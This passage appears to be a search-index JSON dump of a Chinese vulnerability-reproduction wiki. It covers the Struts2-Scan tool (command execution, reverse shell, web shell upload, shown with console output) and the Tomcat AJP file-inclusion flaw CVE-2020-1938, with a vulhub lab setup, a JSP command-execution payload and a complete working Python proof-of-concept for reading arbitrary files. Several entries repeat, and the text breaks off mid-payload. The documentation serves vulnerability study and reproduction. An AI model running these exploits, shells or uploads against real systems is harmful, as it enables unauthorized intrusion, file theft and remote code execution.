\u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-046:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-048:\u5f71\u54cd\u7248\u672cStruts 2.3.x with Struts 1 plugin and Struts 1 action; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-053:\u5f71\u54cd\u7248\u672cStruts 2.0.1-2.3.33,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-devMode:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell","title":"\u67e5\u770b\u6f0f\u6d1e\u8be6\u7ec6\u4fe1\u606f:"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u5355\u4e2aurl\u6f0f\u6d1e\u68c0\u6d4b","text":"$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6b63\u5728\u626b\u63cfURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-046 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-016 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-045 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-015 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-009 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-012","title":"\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b:"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u6279\u91cf\u6f0f\u6d1e\u68c0\u6d4b","text":"$ python3 Struts2Scan.py -f urls.txt","title":"\u6279\u91cf\u6f0f\u6d1e\u68c0\u6d4b:"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#post\u6570\u636e","text":"$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp}","title":"POST\u6570\u636e:"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0\u5229\u7528","text":"# \u547d\u4ee4\u6267\u884c $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # \u53cd\u5f39shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] \u8bf7\u5728\u53cd\u5f39\u5730\u5740\u5904\u76d1\u542c\u7aef\u53e3\u5982: nc -lvvp 8080 # \u83b7\u53d6WEB\u8def\u5f84 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # \u4e0a\u4f20shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6587\u4ef6\u4e0a\u4f20\u6210\u529f!","title":"\u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0\u5229\u7528:"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Struts2-Scan/#\u5173\u4e8e","text":"\u56e0\u90e8\u5206\u539f\u56e0\uff0c\u539f\u4f5c\u8005\u5173\u95ed\u6f0f\u6d1e\u5229\u7528\uff0c\u5982\u9700\u5229\u7528\u53ef\u5220\u9664\u4ee5\u4e0b\u4ee3\u7801\u4f7f\u7528","title":"\u5173\u4e8e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/","text":"Aapache Tomcat AJP \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e CVE-2020-1938 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Java \u662f\u76ee\u524d Web \u5f00\u53d1\u4e2d\u6700\u4e3b\u6d41\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u800c Tomcat \u662f\u5f53\u524d\u6700\u6d41\u884c\u7684 Java \u4e2d\u95f4\u4ef6\u670d\u52a1\u5668\u4e4b\u4e00\uff0c\u4ece\u521d\u7248\u53d1\u5e03\u5230\u73b0\u5728\u5df2\u7ecf\u6709\u4e8c\u5341\u591a\u5e74\u5386\u53f2\uff0c\u5728\u4e16\u754c\u8303\u56f4\u5185\u5e7f\u6cdb\u4f7f\u7528\u3002 Ghostcat\uff08\u5e7d\u7075\u732b\uff09 \u662f\u7531\u957f\u4ead\u79d1\u6280\u5b89\u5168\u7814\u7a76\u5458\u53d1\u73b0\u7684\u5b58\u5728\u4e8e Tomcat \u4e2d\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u7531\u4e8e Tomcat AJP \u534f\u8bae\u8bbe\u8ba1\u4e0a\u5b58\u5728\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u901a\u8fc7 Tomcat AJP Connector \u53ef\u4ee5\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u4f8b\u5982\u53ef\u4ee5\u8bfb\u53d6 webapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u3002\u6b64\u5916\u5728\u76ee\u6807\u5e94\u7528\u6709\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u7684\u60c5\u51b5\u4e0b\uff0c\u914d\u5408\u6587\u4ef6\u5305\u542b\u7684\u5229\u7528\u8fd8\u53ef\u4ee5\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080/ \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u76ee\u524d\u6709\u53ef\u9760\u7684\u5229\u7528\u811a\u672c Gihub\u5de5\u5177\u4e0b\u8f7d\u94fe\u63a5 python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] \u811a\u672c\u9700\u8981\u4f7f\u7528python2\u6765\u8fd0\u884c\uff0c\u6b64\u6f0f\u6d1e\u7528\u4e8e\u4e0a\u4f20\u8def\u5f84\u53ef\u63a7\uff0c\u5f00\u653e8009\u7aef\u53e3AJP\u534f\u8bae\u60c5\u51b5\u4e0b\u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6\u6267\u884c\u547d\u4ee4 <%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"whoami\").getInputStream())).readLine());%> \u6f0f\u6d1e\u5229\u7528POC \u00b6 https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string ( s ): if s is None : return struct . pack ( \">h\" , - 1 ) l = len ( s ) return struct . pack ( \">H %d sb\" % l , l , s . encode ( 'utf8' ), 0 ) def unpack ( stream , fmt ): size = struct . calcsize ( fmt ) buf = stream . read ( size ) return struct . unpack ( fmt , buf ) def unpack_string ( stream ): size , = unpack ( stream , \">h\" ) if size == - 1 : # null string return None res , = unpack ( stream , \" %d s\" % size ) stream . read ( 1 ) # \\0 return res class NotFoundException ( Exception ): pass class AjpBodyRequest ( object ): # server == web server, container == servlet SERVER_TO_CONTAINER , CONTAINER_TO_SERVER = range ( 2 ) MAX_REQUEST_LENGTH = 8186 def __init__ ( self , data_stream , data_len , data_direction = None ): self . data_stream = data_stream self . data_len = data_len self . data_direction = data_direction def serialize ( self ): data = self . data_stream . read ( AjpBodyRequest . MAX_REQUEST_LENGTH ) if len ( data ) == 0 : return struct . pack ( \">bbH\" , 0x12 , 0x34 , 0x00 ) else : res = struct . pack ( \">H\" , len ( data )) res += data if self . data_direction == AjpBodyRequest . SERVER_TO_CONTAINER : header = struct . pack ( \">bbH\" , 0x12 , 0x34 , len ( res )) else : header = struct . pack ( \">bbH\" , 0x41 , 0x42 , len ( res )) return header + res def send_and_receive ( self , socket , stream ): while True : data = self . serialize () socket . send ( data ) r = AjpResponse . receive ( stream ) while r . prefix_code != AjpResponse . GET_BODY_CHUNK and r . prefix_code != AjpResponse . SEND_HEADERS : r = AjpResponse . receive ( stream ) if r . prefix_code == AjpResponse . SEND_HEADERS or len ( data ) == 4 : break class AjpForwardRequest ( object ): _ , OPTIONS , GET , HEAD , POST , PUT , DELETE , TRACE , PROPFIND , PROPPATCH , MKCOL , COPY , MOVE , LOCK , UNLOCK , ACL , REPORT , VERSION_CONTROL , CHECKIN , CHECKOUT , UNCHECKOUT , SEARCH , MKWORKSPACE , UPDATE , LABEL , MERGE , BASELINE_CONTROL , MKACTIVITY = range ( 28 ) REQUEST_METHODS = { 'GET' : GET , 'POST' : POST , 'HEAD' : HEAD , 'OPTIONS' : OPTIONS , 'PUT' : PUT , 'DELETE' : DELETE , 'TRACE' : TRACE } # server == web server, container == servlet SERVER_TO_CONTAINER , CONTAINER_TO_SERVER = range ( 2 ) COMMON_HEADERS = [ \"SC_REQ_ACCEPT\" , \"SC_REQ_ACCEPT_CHARSET\" , \"SC_REQ_ACCEPT_ENCODING\" , \"SC_REQ_ACCEPT_LANGUAGE\" , \"SC_REQ_AUTHORIZATION\" , \"SC_REQ_CONNECTION\" , \"SC_REQ_CONTENT_TYPE\" , \"SC_REQ_CONTENT_LENGTH\" , \"SC_REQ_COOKIE\" , \"SC_REQ_COOKIE2\" , \"SC_REQ_HOST\" , \"SC_REQ_PRAGMA\" , \"SC_REQ_REFERER\" , \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [ \"context\" , \"servlet_path\" , \"remote_user\" , \"auth_type\" , \"query_string\" , \"route\" , \"ssl_cert\" , \"ssl_cipher\" , \"ssl_session\" , \"req_attribute\" , \"ssl_key_size\" , \"secret\" , \"stored_method\" ] def __init__ ( self , data_direction = None ): self . prefix_code = 0x02 self . method = None self . protocol = None self . req_uri = None self . remote_addr = None self . remote_host = None self . server_name = None self . server_port = None self . is_ssl = None self . num_headers = None self . request_headers = None self . attributes = None self . data_direction = data_direction def pack_headers ( self ): self . num_headers = len ( self . request_headers ) res = \"\" res = struct . pack ( \">h\" , self . num_headers ) for h_name in self . request_headers : if h_name . startswith ( \"SC_REQ\" ): code = AjpForwardRequest . COMMON_HEADERS . index ( h_name ) + 1 res += struct . pack ( \"BB\" , 0xA0 , code ) else : res += pack_string ( h_name ) res += pack_string ( self . request_headers [ h_name ]) return res def pack_attributes ( self ): res = b \"\" for attr in self . attributes : a_name = attr [ 'name' ] code = AjpForwardRequest . ATTRIBUTES . index ( a_name ) + 1 res += struct . pack ( \"b\" , code ) if a_name == \"req_attribute\" : aa_name , a_value = attr [ 'value' ] res += pack_string ( aa_name ) res += pack_string ( a_value ) else : res += pack_string ( attr [ 'value' ]) res += struct . pack ( \"B\" , 0xFF ) return res def serialize ( self ): res = \"\" res = struct . pack ( \"bb\" , self . prefix_code , self . method ) res += pack_string ( self . protocol ) res += pack_string ( self . req_uri ) res += pack_string ( self . remote_addr ) res += pack_string ( self . remote_host ) res += pack_string ( self . server_name ) res += struct . pack ( \">h\" , self . server_port ) res += struct . pack ( \"?\" , self . is_ssl ) res += self . pack_headers () res += self . pack_attributes () if self . data_direction == AjpForwardRequest . SERVER_TO_CONTAINER : header = struct . pack ( \">bbh\" , 0x12 , 0x34 , len ( res )) else : header = struct . pack ( \">bbh\" , 0x41 , 0x42 , len ( res )) return header + res def parse ( self , raw_packet ): stream = StringIO ( raw_packet ) self . magic1 , self . magic2 , data_len = unpack ( stream , \"bbH\" ) self . prefix_code , self . method = unpack ( stream , \"bb\" ) self . protocol = unpack_string ( stream ) self . req_uri = unpack_string ( stream ) self . remote_addr = unpack_string ( stream ) self . remote_host = unpack_string ( stream ) self . server_name = unpack_string ( stream ) self . server_port = unpack ( stream , \">h\" ) self . is_ssl = unpack ( stream , \"?\" ) self . num_headers , = unpack ( stream , \">H\" ) self . request_headers = {} for i in range ( self . num_headers ): code , = unpack ( stream , \">H\" ) if code > 0xA000 : h_name = AjpForwardRequest . COMMON_HEADERS [ code - 0xA001 ] else : h_name = unpack ( stream , \" %d s\" % code ) stream . read ( 1 ) # \\0 h_value = unpack_string ( stream ) self . request_headers [ h_name ] = h_value def send_and_receive ( self , socket , stream , save_cookies = False ): res = [] i = socket . sendall ( self . serialize ()) if self . method == AjpForwardRequest . POST : return res r = AjpResponse . receive ( stream ) assert r . prefix_code == AjpResponse . SEND_HEADERS res . append ( r ) if save_cookies and 'Set-Cookie' in r . response_headers : self . headers [ 'SC_REQ_COOKIE' ] = r . response_headers [ 'Set-Cookie' ] # read body chunks and end response packets while True : r = AjpResponse . receive ( stream ) res . append ( r ) if r . prefix_code == AjpResponse . END_RESPONSE : break elif r . prefix_code == AjpResponse . SEND_BODY_CHUNK : continue else : raise NotImplementedError break return res class AjpResponse ( object ): _ , _ , _ , SEND_BODY_CHUNK , SEND_HEADERS , END_RESPONSE , GET_BODY_CHUNK = range ( 7 ) COMMON_SEND_HEADERS = [ \"Content-Type\" , \"Content-Language\" , \"Content-Length\" , \"Date\" , \"Last-Modified\" , \"Location\" , \"Set-Cookie\" , \"Set-Cookie2\" , \"Servlet-Engine\" , \"Status\" , \"WWW-Authenticate\" ] def parse ( self , stream ): # read headers self . magic , self . data_length , self . prefix_code = unpack ( stream , \">HHb\" ) if self . prefix_code == AjpResponse . SEND_HEADERS : self . parse_send_headers ( stream ) elif self . prefix_code == AjpResponse . SEND_BODY_CHUNK : self . parse_send_body_chunk ( stream ) elif self . prefix_code == AjpResponse . END_RESPONSE : self . parse_end_response ( stream ) elif self . prefix_code == AjpResponse . GET_BODY_CHUNK : self . parse_get_body_chunk ( stream ) else : raise NotImplementedError def parse_send_headers ( self , stream ): self . http_status_code , = unpack ( stream , \">H\" ) self . http_status_msg = unpack_string ( stream ) self . num_headers , = unpack ( stream , \">H\" ) self . response_headers = {} for i in range ( self . num_headers ): code , = unpack ( stream , \">H\" ) if code <= 0xA000 : # custom header h_name , = unpack ( stream , \" %d s\" % code ) stream . read ( 1 ) # \\0 h_value = unpack_string ( stream ) else : h_name = AjpResponse . COMMON_SEND_HEADERS [ code - 0xA001 ] h_value = unpack_string ( stream ) self . response_headers [ h_name ] = h_value def parse_send_body_chunk ( self , stream ): self . data_length , = unpack ( stream , \">H\" ) self . data = stream . read ( self . data_length + 1 ) def parse_end_response ( self , stream ): self . reuse , = unpack ( stream , \"b\" ) def parse_get_body_chunk ( self , stream ): rlen , = unpack ( stream , \">H\" ) return rlen @staticmethod def receive ( stream ): r = AjpResponse () r . parse ( stream ) return r import socket def prepare_ajp_forward_request ( target_host , req_uri , method = AjpForwardRequest . GET ): fr = AjpForwardRequest ( AjpForwardRequest . SERVER_TO_CONTAINER ) fr . method = method fr . protocol = \"HTTP/1.1\" fr . req_uri = req_uri fr . remote_addr = target_host fr . remote_host = None fr . server_name = target_host fr . server_port = 80 fr . request_headers = { 'SC_REQ_ACCEPT' : 'text/html' , 'SC_REQ_CONNECTION' : 'keep-alive' , 'SC_REQ_CONTENT_LENGTH' : '0' , 'SC_REQ_HOST' : target_host , 'SC_REQ_USER_AGENT' : 'Mozilla' , 'Accept-Encoding' : 'gzip, deflate, sdch' , 'Accept-Language' : 'en-US,en;q=0.5' , 'Upgrade-Insecure-Requests' : '1' , 'Cache-Control' : 'max-age=0' } fr . is_ssl = False fr . attributes = [] return fr class Tomcat ( object ): def __init__ ( self , target_host , target_port ): self . target_host = target_host self . target_port = target_port self . socket = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . socket . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) self . socket . connect (( target_host , target_port )) self . stream = self . socket . makefile ( \"rb\" , bufsize = 0 ) def perform_request ( self , req_uri , headers = {}, method = 'GET' , user = None , password = None , attributes = []): self . req_uri = req_uri self . forward_request = prepare_ajp_forward_request ( self . target_host , self . req_uri , method = AjpForwardRequest . REQUEST_METHODS . get ( method )) print ( \"Getting resource at ajp13:// %s : %d%s \" % ( self . target_host , self . target_port , req_uri )) if user is not None and password is not None : self . forward_request . request_headers [ 'SC_REQ_AUTHORIZATION' ] = \"Basic \" + ( \" %s : %s \" % ( user , password )) . encode ( 'base64' ) . replace ( ' \\n ' , '' ) for h in headers : self . forward_request . request_headers [ h ] = headers [ h ] for a in attributes : self . forward_request . attributes . append ( a ) responses = self . forward_request . send_and_receive ( self . socket , self . stream ) if len ( responses ) == 0 : return None , None snd_hdrs_res = responses [ 0 ] data_res = responses [ 1 : - 1 ] if len ( data_res ) == 0 : print ( \"No data in response. Headers: %s \\n \" % snd_hdrs_res . response_headers ) return snd_hdrs_res , data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse . ArgumentParser () parser . add_argument ( \"target\" , type = str , help = \"Hostname or IP to attack\" ) parser . add_argument ( '-p' , '--port' , type = int , default = 8009 , help = \"AJP port to attack (default is 8009)\" ) parser . add_argument ( \"-f\" , '--file' , type = str , default = 'WEB-INF/web.xml' , help = \"file path :(WEB-INF/web.xml)\" ) args = parser . parse_args () t = Tomcat ( args . target , args . port ) _ , data = t . perform_request ( '/asdf' , attributes = [ { 'name' : 'req_attribute' , 'value' :[ 'javax.servlet.include.request_uri' , '/' ]}, { 'name' : 'req_attribute' , 'value' :[ 'javax.servlet.include.path_info' , args . file ]}, { 'name' : 'req_attribute' , 'value' :[ 'javax.servlet.include.servlet_path' , '/' ]}, ]) print ( '----------------------------' ) print ( \"\" . join ([ d . data for d in data ])) \u53c2\u8003\u6587\u7ae0 \u00b6 Github\u5730\u5740 \u5a01\u80c1\u901a\u544a APACHE TOMCAT \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2020-1938\uff09","title":"Apache Tomcat AJP \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e CVE-2020-1938"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#aapache-tomcat-ajp-\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e-cve-2020-1938","text":"","title":"Aapache Tomcat AJP \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e CVE-2020-1938"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Java \u662f\u76ee\u524d Web \u5f00\u53d1\u4e2d\u6700\u4e3b\u6d41\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u800c Tomcat \u662f\u5f53\u524d\u6700\u6d41\u884c\u7684 Java \u4e2d\u95f4\u4ef6\u670d\u52a1\u5668\u4e4b\u4e00\uff0c\u4ece\u521d\u7248\u53d1\u5e03\u5230\u73b0\u5728\u5df2\u7ecf\u6709\u4e8c\u5341\u591a\u5e74\u5386\u53f2\uff0c\u5728\u4e16\u754c\u8303\u56f4\u5185\u5e7f\u6cdb\u4f7f\u7528\u3002 Ghostcat\uff08\u5e7d\u7075\u732b\uff09 \u662f\u7531\u957f\u4ead\u79d1\u6280\u5b89\u5168\u7814\u7a76\u5458\u53d1\u73b0\u7684\u5b58\u5728\u4e8e Tomcat \u4e2d\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u7531\u4e8e Tomcat AJP \u534f\u8bae\u8bbe\u8ba1\u4e0a\u5b58\u5728\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u901a\u8fc7 Tomcat AJP Connector \u53ef\u4ee5\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u4f8b\u5982\u53ef\u4ee5\u8bfb\u53d6 webapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u3002\u6b64\u5916\u5728\u76ee\u6807\u5e94\u7528\u6709\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u7684\u60c5\u51b5\u4e0b\uff0c\u914d\u5408\u6587\u4ef6\u5305\u542b\u7684\u5229\u7528\u8fd8\u53ef\u4ee5\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080/ \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20AJP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2020-1938/#\u6f0f\u6d1e\u590d\u73b0","text":"\u76ee\u524d\u6709\u53ef\u9760\u7684\u5229\u7528\u811a\u672c Gihub\u5de5\u5177\u4e0b\u8f7d\u94fe\u63a5 python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] \u811a\u672c\u9700\u8981\u4f7f\u7528python2\u6765\u8fd0\u884c\uff0c\u6b64\u6f0f\u6d1e\u7528\u4e8e\u4e0a\u4f20\u8def\u5f84\u53ef\u63a7\uff0c\u5f00\u653e8009\u7aef\u53e3AJP\u534f\u8bae\u60c5\u51b5\u4e0b\u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6\u6267\u884c\u547d\u4ee4 <%out.println(new java.io.BufferedReader(new 